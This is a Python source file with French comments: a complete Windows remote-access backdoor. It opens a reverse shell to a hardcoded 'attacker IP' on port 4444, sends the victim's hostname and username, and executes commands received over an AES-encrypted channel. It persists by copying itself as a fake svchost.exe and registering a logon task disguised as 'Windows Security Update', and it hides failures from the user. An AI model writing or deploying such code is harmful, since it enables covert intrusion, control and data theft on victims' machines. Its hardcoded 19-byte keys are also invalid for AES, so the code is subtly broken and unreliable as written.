import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import uuid
import ctypes

# --- Configuration ---
# ATTENTION: MODIFIEZ CES VALEURS. Utilisez une clé et un IV de 16/32 octets.
# Générez-les aléatoirement pour chaque déploiement.
# Exemple de génération en Python : os.urandom(16)
AES_KEY = b'baKj8#mP2$qR9@tN5!a' # 16, 24, or 32 bytes
AES_IV = b'bazX4&vW7*yE1@sL6#a'  # 16 bytes
HOST = '172.28.10.49'  # IP de l'attaquant
PORT = 4444            # Port de l'attaquant

# --- Variables obfusquées pour la persistance ---
PERSISTS_PATH = os.path.join(os.environ['APPDATA'], 'Local', 'Microsoft', 'Windows', 'svchost.exe')
TASK_NAME = f"Windows Security Update {str(uuid.uuid4())[:8]}"

def aes_encrypt(data):
    """Chiffre les données avec AES-CBC."""
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    """Déchiffre les données avec AES-CBC."""
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def establish_persistence():
    """Établit la persistance en se copiant et en créant une tâche planifiée."""
    if sys.executable != PERSISTS_PATH:
        try:
            # Copie du script dans un emplacement permanent
            if not os.path.exists(os.path.dirname(PERSISTS_PATH)):
                os.makedirs(os.path.dirname(PERSISTS_PATH))
            
            # Si compilé en .exe, copier l'exécutable
            if getattr(sys, 'frozen', False):
                import shutil
                shutil.copyfile(sys.executable, PERSISTS_PATH)
            else: # Sinon, copier le script .py
                with open(PERSISTS_PATH, 'w') as f_copy:
                    with open(sys.argv[0], 'r') as f_orig:
                        f_copy.write(f_orig.read())

            # Création de la tâche planifiée (nécessite des droits admin pour une vraie persistance système)
            # Ici, on crée une tâche utilisateur qui fonctionne sans admin
            cmd = f'schtasks /create /tn "{TASK_NAME}" /tr "{PERSISTS_PATH}" /sc onlogon /f'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Lancement immédiat de la nouvelle copie et sortie de l'actuelle
            subprocess.Popen(PERSISTS_PATH, shell=True)
            sys.exit(0)
        except Exception as e:
            # Échec silencieux pour ne pas alerter l'utilisateur
            pass

def run_cmd(command):
    """Exécute une commande et renvoie la sortie."""
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            result = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    """Gère la communication avec l'attaquant."""
    s.settimeout(10) # Timeout pour éviter de rester bloqué indéfiniment
    try:
        # Envoi des informations initiales
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            encrypted_cmd = s.recv(4096).decode('utf-8')
            if not encrypted_cmd:
                break
            
            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))
            else:
                s.send(aes_encrypt("Encryption error.").encode('utf-8'))

    except socket.timeout:
        s.close()
    except Exception:
        s.close()

def main_loop():
    """Boucle principale de connexion."""
    establish_persistence()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            handle_connection(s)
        except Exception:
            time.sleep(30) # Attendre 30 secondes avant de retenter

# Vérification des privilèges (optionnel, pour des actions plus sensibles)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Lancement du thread principal
if __name__ == "__main__":
    # Pour un vrai déploiement, vous voudriez vérifier si le script est déjà en cours d'exécution
    # pour éviter d'avoir plusieurs instances.
    main_thread = threading.Thread(target=main_loop, daemon=True)
    main_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)
